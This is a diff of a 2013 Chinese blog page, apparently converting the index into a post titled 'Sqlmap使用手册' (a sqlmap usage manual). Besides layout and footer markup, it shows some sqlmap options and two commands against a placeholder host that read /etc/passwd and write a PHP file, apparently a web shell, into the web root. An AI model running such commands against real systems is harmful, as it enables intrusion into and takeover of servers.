@@ -5,7 +5,7 @@
 <!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
 <head>
   <meta charset="utf-8">
-  <title>Str0cker的博客</title>
+  <title>sqlmap使用手册 - Str0cker的博客</title>
   <meta name="author" content="str0cker">
 
   
@@ -24,7 +24,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
   
-  <link rel="canonical" href="http://russhamiton.github.com/">
+  <link rel="canonical" href="http://russhamiton.github.com/blog/2013/01/01/sqlmapshi-yong-shou-ce/">
   <link href="/favicon.png" rel="icon">
   <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
   <script src="/javascripts/modernizr-2.0.js"></script>
@@ -68,15 +68,12 @@
 </nav>
   <div id="main">
     <div id="content">
-      <div class="blog-index">
+      <div>
+<article class="hentry" role="article">
   
-  
-  
-    <article>
-      
   <header>
     
-      <h1 class="entry-title"><a href="/blog/2013/01/01/sqlmapshi-yong-shou-ce/">Sqlmap使用手册</a></h1>
+      <h1 class="entry-title">Sqlmap使用手册</h1>
     
     
       <p class="meta">
@@ -99,7 +96,7 @@
   </header>
 
 
-  <div class="entry-content"><p>-u #注入点
+<div class="entry-content"><p>-u #注入点
 -f #指纹判别数据库类型
 -b #获取数据库版本信息
 -p #指定可测试的参数(?page=1&amp;id=2 -p &#8220;page,id&#8221;)
@@ -242,18 +239,51 @@ sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read"/etc/passwd"-v2
 sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file-dest /var/www/html/xx.php -v2
 </code></pre>
 </div>
+
+
+  <footer>
+    <p class="meta">
+      
   
+
+<span class="byline author vcard">Posted by <span class="fn">str0cker</span></span>
+
+      
+
+
+
+
+
+
+
+
   
 
 
-    </article>
+<time datetime="2013-01-01T15:18:00+08:00" pubdate data-updated="true">Jan 1<span>st</span>, 2013</time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
   
-  <div class="pagination">
-    
-    <a href="/blog/archives">Blog Archives</a>
-    
-  </div>
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://russhamiton.github.com/blog/2013/01/01/sqlmapshi-yong-shou-ce/" data-via="" data-counturl="http://russhamiton.github.com/blog/2013/01/01/sqlmapshi-yong-shou-ce/" >Tweet</a>
+  
+  
+  
 </div>
+
+    
+    <p class="meta">
+      
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
 <aside class="sidebar">
   
     <section>
@@ -274,6 +304,7 @@ sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --fil
 
   
 </aside>
+
 
     </div>
   </div>
